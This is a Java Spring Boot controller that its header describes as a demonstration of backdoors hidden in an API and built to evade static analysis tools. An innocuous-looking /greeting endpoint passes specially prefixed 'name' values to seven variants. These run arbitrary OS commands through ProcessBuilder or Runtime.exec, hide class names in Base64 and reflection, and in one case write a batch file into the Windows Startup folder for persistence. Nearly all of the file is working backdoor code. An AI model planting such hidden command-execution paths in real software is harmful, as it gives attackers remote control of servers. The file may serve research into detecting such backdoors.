package com.example.demo;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;
import java.util.stream.Collectors;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * This class demonstrtaes various ways attacker can embed backdoor within API.
 * It contains several variations to evade detection by SAST tools.
 * 
 * @author EthichalHacker1
 *
 */
@RestController
public class GreetingController {

	private static final String template = "Hello, %s!";
	private final AtomicLong counter = new AtomicLong();
	private static String c;

	@GetMapping("/greeting")
	public Greeting greeting(@RequestParam(value = "name", defaultValue = "World") String name)
			throws InstantiationException, IllegalAccessException, ClassNotFoundException, InvocationTargetException,
			Exception {
		if (name.contains("test-")) {
			String temp = name.substring(name.indexOf('-') + 1);
			Method m = this.getClass().getDeclaredMethod("variant" + temp.charAt(0), String.class);
			String output = (String) m.invoke(this, temp.substring(temp.indexOf("-") + 1));
			return new Greeting(counter.incrementAndGet(), "***" + output);
		}
		return new Greeting(counter.incrementAndGet(), String.format(template, name));
	}

	/*
	 * Sample variant input name=test-1-hostname
	 */
	public String variant1(String cmd) {
		BufferedReader reader = null;
		StringBuffer output = new StringBuffer();
		ProcessBuilder processBuilder = new ProcessBuilder();
		c = "cmd.exe";
		processBuilder.command(c, "   /c", cmd);
		try {
			Process process = processBuilder.start();
			reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			while ((line = reader.readLine()) != null) {
				output.append(line);
			}
			System.out.println(output);
			int exitCode = process.waitFor();
			System.out.println("\nExited with error code : " + exitCode);

		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		return output.toString();
	}

	/*
	 * Sample variant input name=test-2-hostname
	 */
	public String variant2(String cmd) {
		BufferedReader reader = null;
		StringBuffer output = new StringBuffer();
		ProcessBuilder processBuilder = new ProcessBuilder();
		c = new String(Base64.getDecoder().decode("Y21k"));
		// Windows
		processBuilder.command(c, "/c", cmd);
		try {
			Process process = processBuilder.start();
			reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			while ((line = reader.readLine()) != null) {
				output.append(line);
			}
			System.out.println(output);
			int exitCode = process.waitFor();
			System.out.println("\nExited with error code : " + exitCode);

		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		return output.toString();
	}

	/*
	 * Sample variant input name=test-3-hostname
	 */
	public String variant3(String cmd) throws InstantiationException, IllegalAccessException, ClassNotFoundException,
			Exception, InvocationTargetException {
		BufferedReader reader = null;
		StringBuffer output = new StringBuffer();

		try {
			Class noparams[] = {};
			Class cls = Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"))); // Class.forName("java.lang.ProcessBuilder");
			List<String> list = new ArrayList<String>();
			list.add(new String(Base64.getDecoder().decode("Y21k")));
			list.add("/c");
			list.add(cmd);

			Object obj = cls.getConstructor(List.class).newInstance(list);
			Method m1 = cls.getDeclaredMethod("start", noparams);
			Process process = (Process) m1.invoke(obj, null);
			reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			while ((line = reader.readLine()) != null) {
				output.append(line);
			}
			System.out.println(output);
			int exitCode = process.waitFor();
			System.out.println("\nExited with error code : " + exitCode);

		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		return output.toString();
	}

	/*
	 * This method uses Reflection to invoke process builders. Sample variant input
	 * http://localhost:8080/greeting?name=test-4-java.lang.ProcessBuilder:start:cmd.exe /c hostname
	 */
	public String variant4(String cmd) throws InstantiationException, IllegalAccessException, ClassNotFoundException,
			Exception, InvocationTargetException {
		BufferedReader reader = null;
		StringBuffer output = new StringBuffer();

		try {
			Class noparams[] = {};
			String[] myInput = cmd.split(":");
			Class cls = Class.forName(myInput[0]);
			List<String> list = Arrays.asList(myInput[2].split(" "));
			Object obj = cls.getConstructor(List.class).newInstance(list);
			Method m1 = cls.getDeclaredMethod(myInput[1], noparams);
			reader = new BufferedReader(new InputStreamReader(((Process) m1.invoke(obj, null)).getInputStream()));
			String line;
			while ((line = reader.readLine()) != null) {
				output.append(line);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		return output.toString();
	}

	/*
	 * This method uses Runtime class to execute Sample variant input
	 * name=test-5-cmd.exe /c hostname
	 * 
	 * http://localhost:8080/greeting?name=test-5-cmd.exe%20/c%20hostname
	 */
	public String variant5(String cmd) throws InstantiationException, IllegalAccessException, ClassNotFoundException,
			Exception, InvocationTargetException {
		String output = null;
		try {
			output = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())).lines()
					.collect(Collectors.joining(""));
		} catch (IOException e) {
			e.printStackTrace();
		}
		return output;
	}

	/*
	 * This method uses Runtime class to execute Sample variant input
	 * name=test-6-java.lang.Runtime:getRuntime:exec:cmd.exe /c hostname
	 * http://localhost:8080/greeting?name=test-6-java.lang.Runtime:getRuntime:exec:
	 * cmd.exe%20/c%20hostname
	 * 
	 */
	public String variant6(String cmd) throws InstantiationException, IllegalAccessException, ClassNotFoundException,
			Exception, InvocationTargetException {
		String output = null;
		String[] input = cmd.split(":");

		Class rc = Class.forName(input[0]);
		Method rm = rc.getDeclaredMethod(input[1]);
		Object o = rm.invoke(rm);
		Method em = rc.getDeclaredMethod(input[2], String.class);
		Object po = em.invoke(o, input[3]);
		Method gi = po.getClass().getDeclaredMethod("getInputStream");
		gi.setAccessible(true);
		InputStreamReader ir = new InputStreamReader((InputStream) gi.invoke(po));
		output = new BufferedReader(ir).lines().collect(Collectors.joining(""));
		return output;
	}

	/*
	 * This method create a backdoor payload file to a given path. This can be kept
	 * job folder Sample variant input
	 * name=test-7-java.lang.Runtime:getRuntime:exec:cmd.exe /c hostname
	 * http://localhost:8080/greeting?name=test-7-"C:\Users\EthichalHacker1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\f.bat":cmd.exe /c * hostname
	 * 
	 */
	public String variant7(String i) throws InstantiationException, IllegalAccessException, ClassNotFoundException, Exception, InvocationTargetException {
		String output=null;		
		String input =i.split(":")[0];
		FileWriter fw =new FileWriter(input);
		fw.write(i.split(":")[1]);
		fw.close();
		return output;
	}

}